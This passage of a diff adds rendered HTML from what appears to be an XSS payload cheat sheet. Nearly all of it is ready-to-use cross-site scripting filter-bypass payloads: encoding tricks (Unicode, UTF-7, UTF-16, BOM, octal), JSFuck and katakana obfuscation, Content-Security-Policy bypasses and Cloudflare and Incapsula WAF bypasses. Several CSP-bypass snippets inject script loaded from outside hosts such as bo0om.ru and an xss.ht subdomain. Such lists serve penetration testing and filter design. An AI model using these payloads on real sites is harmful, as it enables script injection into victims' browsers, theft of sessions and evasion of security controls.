+<span class="hljs-string">&apos;te&apos;</span> &amp; alert(<span class="hljs-string">&apos;&amp;&apos;</span>) &amp; <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> , alert(<span class="hljs-string">&apos;,&apos;</span>) , <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> | alert(<span class="hljs-string">&apos;|&apos;</span>) | <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> ? alert(<span class="hljs-string">&apos;ifelsesh&apos;</span>) : <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> <span class="hljs-keyword">in</span> alert(<span class="hljs-string">&apos;in&apos;</span>) <span class="hljs-keyword">in</span> <span class="hljs-string">&apos;xt&apos;</span>;
+<span class="hljs-string">&apos;te&apos;</span> <span class="hljs-keyword">instanceof</span> alert(<span class="hljs-string">&apos;instanceof&apos;</span>) <span class="hljs-keyword">instanceof</span> <span class="hljs-string">&apos;xt&apos;</span>;
+</code></pre>
+<h3 id="bypass-using-html-encoding">Bypass using HTML encoding</h3>
+<pre><code class="lang-javascript">%<span class="hljs-number">26</span>%<span class="hljs-number">2397</span>;lert(<span class="hljs-number">1</span>)
+</code></pre>
+<h3 id="bypass-using-katana">Bypass using Katana</h3>
+<p>Using the <a href="https://github.com/aemkei/katakana.js" target="_blank">Katakana</a> library.</p>
+<pre><code class="lang-javascript">javascript:([,&#x30A6;,,,,&#x30A2;]=[]+{},[&#x30CD;,&#x30DB;,&#x30CC;,&#x30BB;,,&#x30DF;,&#x30CF;,&#x30D8;,,,&#x30CA;]=[!!&#x30A6;]+!&#x30A6;+&#x30A6;.&#x30A6;)[&#x30C4;=&#x30A2;+&#x30A6;+&#x30CA;+&#x30D8;+&#x30CD;+&#x30DB;+&#x30CC;+&#x30A2;+&#x30CD;+&#x30A6;+&#x30DB;][&#x30C4;](&#x30DF;+&#x30CF;+&#x30BB;+&#x30DB;+&#x30CD;+<span class="hljs-string">&apos;(-~&#x30A6;)&apos;</span>)()
+</code></pre>
+<h3 id="bypass-using-lontara">Bypass using Lontara</h3>
+<pre><code class="lang-javscript">&#x1A06;=&apos;&apos;,&#x1A0A;=!&#x1A06;+&#x1A06;,&#x1A0E;=!&#x1A0A;+&#x1A06;,&#x1A02;=&#x1A06;+{},&#x1A07;=&#x1A0A;[&#x1A06;++],&#x1A0B;=&#x1A0A;[&#x1A0F;=&#x1A06;],&#x1A03;=++&#x1A0F;+&#x1A06;,&#x1A05;=&#x1A02;[&#x1A0F;+&#x1A03;],&#x1A0A;[&#x1A05;+=&#x1A02;[&#x1A06;]+(&#x1A0A;.&#x1A0E;+&#x1A02;)[&#x1A06;]+&#x1A0E;[&#x1A03;]+&#x1A07;+&#x1A0B;+&#x1A0A;[&#x1A0F;]+&#x1A05;+&#x1A07;+&#x1A02;[&#x1A06;]+&#x1A0B;][&#x1A05;](&#x1A0E;[&#x1A06;]+&#x1A0E;[&#x1A0F;]+&#x1A0A;[&#x1A03;]+&#x1A0B;+&#x1A07;+&quot;(&#x1A06;)&quot;)()
+</code></pre>
+<p>More alphabets on <a href="http://aem1k.com/aurebesh.js/#" target="_blank">http://aem1k.com/aurebesh.js/#</a></p>
+<h3 id="bypass-using-ecmascript6">Bypass using ECMAScript6</h3>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">alert&amp;DiacriticalGrave;1&amp;DiacriticalGrave;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<h3 id="bypass-using-octal-encoding">Bypass using Octal encoding</h3>
+<pre><code class="lang-javascript">javascript:<span class="hljs-string">&apos;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&apos;</span>
+</code></pre>
+<h3 id="bypass-using-unicode">Bypass using Unicode</h3>
+<pre><code class="lang-javascript">Unicode character U+FF1C FULLWIDTH LESS&#xAD;THAN SIGN (encoded <span class="hljs-keyword">as</span> %EF%BC%<span class="hljs-number">9</span>C) was
+transformed into U+<span class="hljs-number">003</span>C LESS&#xAD;THAN SIGN (<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">)</span>
+
+<span class="hljs-attr">Unicode</span> <span class="hljs-attr">character</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">02BA</span> <span class="hljs-attr">MODIFIER</span> <span class="hljs-attr">LETTER</span> <span class="hljs-attr">DOUBLE</span> <span class="hljs-attr">PRIME</span> (<span class="hljs-attr">encoded</span> <span class="hljs-attr">as</span> %<span class="hljs-attr">CA</span>%<span class="hljs-attr">BA</span>) <span class="hljs-attr">was</span>
+<span class="hljs-attr">transformed</span> <span class="hljs-attr">into</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">0022</span> <span class="hljs-attr">QUOTATION</span> <span class="hljs-attr">MARK</span> (&quot;)
+
+<span class="hljs-attr">Unicode</span> <span class="hljs-attr">character</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">02B9</span> <span class="hljs-attr">MODIFIER</span> <span class="hljs-attr">LETTER</span> <span class="hljs-attr">PRIME</span> (<span class="hljs-attr">encoded</span> <span class="hljs-attr">as</span> %<span class="hljs-attr">CA</span>%<span class="hljs-attr">B9</span>) <span class="hljs-attr">was</span>
+<span class="hljs-attr">transformed</span> <span class="hljs-attr">into</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">0027</span> <span class="hljs-attr">APOSTROPHE</span> (&apos;)
+
+<span class="hljs-attr">Unicode</span> <span class="hljs-attr">character</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">FF1C</span> <span class="hljs-attr">FULLWIDTH</span> <span class="hljs-attr">LESS</span>&#xAD;<span class="hljs-attr">THAN</span> <span class="hljs-attr">SIGN</span> (<span class="hljs-attr">encoded</span> <span class="hljs-attr">as</span> %<span class="hljs-attr">EF</span>%<span class="hljs-attr">BC</span>%<span class="hljs-attr">9C</span>) <span class="hljs-attr">was</span>
+<span class="hljs-attr">transformed</span> <span class="hljs-attr">into</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">003C</span> <span class="hljs-attr">LESS</span>&#xAD;<span class="hljs-attr">THAN</span> <span class="hljs-attr">SIGN</span> (&lt;)
+
+<span class="hljs-attr">Unicode</span> <span class="hljs-attr">character</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">02BA</span> <span class="hljs-attr">MODIFIER</span> <span class="hljs-attr">LETTER</span> <span class="hljs-attr">DOUBLE</span> <span class="hljs-attr">PRIME</span> (<span class="hljs-attr">encoded</span> <span class="hljs-attr">as</span> %<span class="hljs-attr">CA</span>%<span class="hljs-attr">BA</span>) <span class="hljs-attr">was</span>
+<span class="hljs-attr">transformed</span> <span class="hljs-attr">into</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">0022</span> <span class="hljs-attr">QUOTATION</span> <span class="hljs-attr">MARK</span> (&quot;)
+
+<span class="hljs-attr">Unicode</span> <span class="hljs-attr">character</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">02B9</span> <span class="hljs-attr">MODIFIER</span> <span class="hljs-attr">LETTER</span> <span class="hljs-attr">PRIME</span> (<span class="hljs-attr">encoded</span> <span class="hljs-attr">as</span> %<span class="hljs-attr">CA</span>%<span class="hljs-attr">B9</span>) <span class="hljs-attr">was</span>
+<span class="hljs-attr">transformed</span> <span class="hljs-attr">into</span> <span class="hljs-attr">U</span>+<span class="hljs-attr">0027</span> <span class="hljs-attr">APOSTROPHE</span> (&apos;)
+
+<span class="hljs-attr">E.g</span> <span class="hljs-attr">:</span> <span class="hljs-attr">http:</span>//<span class="hljs-attr">www.example.net</span>/<span class="hljs-attr">something</span>%<span class="hljs-attr">CA</span>%<span class="hljs-attr">BA</span>%<span class="hljs-attr">EF</span>%<span class="hljs-attr">BC</span>%<span class="hljs-attr">9E</span>%<span class="hljs-attr">EF</span>%<span class="hljs-attr">BC</span>%<span class="hljs-attr">9Csvg</span>%<span class="hljs-attr">20onload</span>=<span class="hljs-string">alert%28</span>/<span class="hljs-attr">XSS</span>/%<span class="hljs-attr">29</span>%<span class="hljs-attr">EF</span>%<span class="hljs-attr">BC</span>%<span class="hljs-attr">9E</span>/
+%<span class="hljs-attr">EF</span>%<span class="hljs-attr">BC</span>%<span class="hljs-attr">9E</span> <span class="hljs-attr">becomes</span> &gt;</span>
+%EF%BC%9C becomes <span class="hljs-tag">&lt;
+</span></span></code></pre>
+<p>Bypass using Unicode converted to uppercase</p>
+<pre><code class="lang-javascript">&#x130; (%c4%b0).toLowerCase() =&gt; i
+&#x131; (%c4%b1).toUpperCase() =&gt; I
+&#x17F; (%c5%bf) .toUpperCase() =&gt; S
+&#x212A; (%E2%<span class="hljs-number">84</span>%AA).toLowerCase() =&gt; k
+
+&lt;&#x17F;vg onload=... &gt; become &lt;SVG ONLOAD=...&gt;
+&lt;&#x131;frame id=x onload=&gt;.toUpperCase() become &lt;IFRAME ID=X ONLOAD=&gt;
+</code></pre>
+<h3 id="bypass-using-utf-7">Bypass using UTF-7</h3>
+<pre><code class="lang-javascript">+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+</code></pre>
+<h3 id="bypass-using-utf-8">Bypass using UTF-8</h3>
+<pre><code class="lang-javascript">&lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC
+&gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE
+&apos; = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
+&quot; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
+&quot; = %CA%BA
+&apos; = %CA%B9
+</code></pre>
+<h3 id="bypass-using-utf-16be">Bypass using UTF-16be</h3>
+<pre><code class="lang-javascript">%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">00</span>s%<span class="hljs-number">00</span>v%<span class="hljs-number">00</span>g%<span class="hljs-number">00</span>/%<span class="hljs-number">00</span>o%<span class="hljs-number">00</span>n%<span class="hljs-number">00</span>l%<span class="hljs-number">00</span>o%<span class="hljs-number">00</span>a%<span class="hljs-number">00</span>d%<span class="hljs-number">00</span>=%<span class="hljs-number">00</span>a%<span class="hljs-number">00</span>l%<span class="hljs-number">00</span>e%<span class="hljs-number">00</span>r%<span class="hljs-number">00</span>t%<span class="hljs-number">00</span>(%<span class="hljs-number">00</span>)%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">00</span>
+\x00&lt;\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00&gt;
+</code></pre>
+<h3 id="bypass-using-utf-32">Bypass using UTF-32</h3>
+<pre><code class="lang-js">%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>s%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>v%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>g%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>/%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>o%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>n%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>l%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>o%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>a%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>d%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>=%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>a%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>l%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>e%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>r%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>t%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>(%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>)%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>E
+</code></pre>
+<h3 id="bypass-using-bom">Bypass using BOM</h3>
+<p>Byte Order Mark (The page must begin with the BOM character.)
+BOM character allows you to override charset of the page</p>
+<pre><code class="lang-js">BOM Character <span class="hljs-keyword">for</span> UTF<span class="hljs-number">-16</span> Encoding:
+Big Endian : <span class="hljs-number">0xFE</span> <span class="hljs-number">0xFF</span>
+Little Endian : <span class="hljs-number">0xFF</span> <span class="hljs-number">0xFE</span>
+XSS : %fe%ff%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">00</span>s%<span class="hljs-number">00</span>v%<span class="hljs-number">00</span>g%<span class="hljs-number">00</span>/%<span class="hljs-number">00</span>o%<span class="hljs-number">00</span>n%<span class="hljs-number">00</span>l%<span class="hljs-number">00</span>o%<span class="hljs-number">00</span>a%<span class="hljs-number">00</span>d%<span class="hljs-number">00</span>=%<span class="hljs-number">00</span>a%<span class="hljs-number">00</span>l%<span class="hljs-number">00</span>e%<span class="hljs-number">00</span>r%<span class="hljs-number">00</span>t%<span class="hljs-number">00</span>(%<span class="hljs-number">00</span>)%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>E
+
+BOM Character <span class="hljs-keyword">for</span> UTF<span class="hljs-number">-32</span> Encoding:
+Big Endian : <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0xFE</span> <span class="hljs-number">0xFF</span>
+Little Endian : <span class="hljs-number">0xFF</span> <span class="hljs-number">0xFE</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span>
+XSS : %<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%fe%ff%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>s%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>v%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>g%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>/%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>o%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>n%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>l%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>o%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>a%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>d%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>=%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>a%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>l%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>e%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>r%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>t%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>(%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>)%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>E
+</code></pre>
+<h3 id="bypass-using-weird-encoding-or-native-interpretation">Bypass using weird encoding or native interpretation</h3>
+<pre><code class="lang-javascript">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;/script&gt;
+&lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt;
+&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;$=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();&lt;/script&gt;
+&lt;script&gt;(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()&lt;/script&gt;
+</code></pre>
+<h2 id="csp-bypass">CSP Bypass</h2>
+<p>Check the CSP on <a href="https://csp-evaluator.withgoogle.com" target="_blank">https://csp-evaluator.withgoogle.com</a> and the post : <a href="https://appio.dev/vulns/google-csp-evaluator/" target="_blank">How to use Google&#x2019;s CSP Evaluator to bypass CSP</a></p>
+<h3 id="bypass-csp-using-jsonp-from-google-trick-by-apfeifer27">Bypass CSP using JSONP from Google (Trick by <a href="https://twitter.com/apfeifer27" target="_blank">@apfeifer27</a>)</h3>
+<p>//google.com/complete/search?client=chrome&amp;jsonp=alert(1);</p>
+<pre><code class="lang-js">&lt;script/src=<span class="hljs-comment">//google.com/complete/search?client=chrome%26jsonp=alert(1);&gt;&quot;</span>
+</code></pre>
+<p>More JSONP endpoints available in <a href="Intruders/jsonp_endpoint.txt">/Intruders/jsonp_endpoint.txt</a></p>
+<h3 id="bypass-csp-by-labwallarmcom">Bypass CSP by <a href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa" target="_blank">lab.wallarm.com</a></h3>
+<p>Works for CSP like <code>Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos;;</code>, <a href="http://hsts.pro/csp.php?xss=f=document.createElement%28&quot;iframe&quot;%29;f.id=&quot;pwn&quot;;f.src=&quot;/robots.txt&quot;;f.onload=%28%29=&gt;%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;" target="_blank">POC here</a></p>
+<pre><code class="lang-js">script=<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;script&apos;</span>);
+script.src=<span class="hljs-string">&apos;//bo0om.ru/csp.js&apos;</span>;
+<span class="hljs-built_in">window</span>.frames[<span class="hljs-number">0</span>].document.head.appendChild(script);
+</code></pre>
+<h3 id="bypass-csp-by-rhynorater">Bypass CSP by <a href="https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f" target="_blank">Rhynorater</a></h3>
+<pre><code class="lang-js">d=<span class="hljs-built_in">document</span>;f=d.createElement(<span class="hljs-string">&quot;iframe&quot;</span>);f.src=d.querySelector(<span class="hljs-string">&apos;link[href*=&quot;.css&quot;]&apos;</span>).href;d.body.append(f);s=d.createElement(<span class="hljs-string">&quot;script&quot;</span>);s.src=<span class="hljs-string">&quot;https://yoursubdomain.xss.ht&quot;</span>;setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{f.contentWindow.document.head.append(s);},<span class="hljs-number">1000</span>)
+</code></pre>
+<h3 id="bypass-csp-by-akitazen">Bypass CSP by <a href="https://twitter.com/akita_zen" target="_blank">@akita_zen</a></h3>
+<p>Works for CSP like <code>script-src self</code></p>
+<pre><code class="lang-js">&lt;object data=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></span>
+</code></pre>
+<h2 id="common-waf-bypass">Common WAF Bypass</h2>
+<h3 id="cloudflare-xss-bypasses-by-bohdan-korzhynskyi---3rd-june-2019">Cloudflare XSS Bypasses by <a href="https://twitter.com/h1_ragnar" target="_blank">@Bohdan Korzhynskyi</a> - 3rd june 2019</h3>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">prompt%26%230000000040document.domain)</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">prompt%26%23x000000028;document.domain)</span>&gt;</span>
+xss&apos;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&apos;%26lt;script&gt;;prompt`${document.domain}`%26lt;/script&gt;&apos;</span>&gt;</span>
+</code></pre>
+<h3 id="cloudflare-xss-bypass---22nd-march-2019-by-rakeshmane10">Cloudflare XSS Bypass - 22nd march 2019 (by @RakeshMane10)</h3>
+<pre><code>&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f
+</code></pre><h3 id="cloudflare-xss-bypass---27th-february-2018">Cloudflare XSS Bypass - 27th february 2018</h3>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;&amp;lpar;a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(document.domain)&amp;rpar;&quot;</span>&gt;</span>X<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+</code></pre>
+<h3 id="chrome-auditor---9th-august-2018">Chrome Auditor - 9th august 2018</h3>
+<pre><code class="lang-javascript">&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)-%26apos%3B
+</code></pre>
+<p>Live example by @brutelogic - <a href="https://brutelogic.com.br/xss.php?c1=&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1" target="_blank">https://brutelogic.com.br/xss.php</a>-%26apos%3B)</p>
+<h3 id="incapsula-waf-bypass-by-alra3ees--8th-march-2018">Incapsula WAF Bypass by <a href="https://twitter.com/Alra3ees/status/971847839931338752" target="_blank">@Alra3ees</a>- 8th march 2018</h3>
+<pre><code class="lang-javascript">anythinglr00&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;alert(document.domain)&lt;/</span>script&gt;uxldz
+
+anythinglr00%<span class="hljs-number">3</span>c%<span class="hljs-number">2</span>fscript%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(<span class="hljs-built_in">document</span>.domain)%<span class="hljs-number">3</span>c%<span class="hljs-number">2</span>fscript%<span class="hljs-number">3</span>euxldz
+</code></pre>
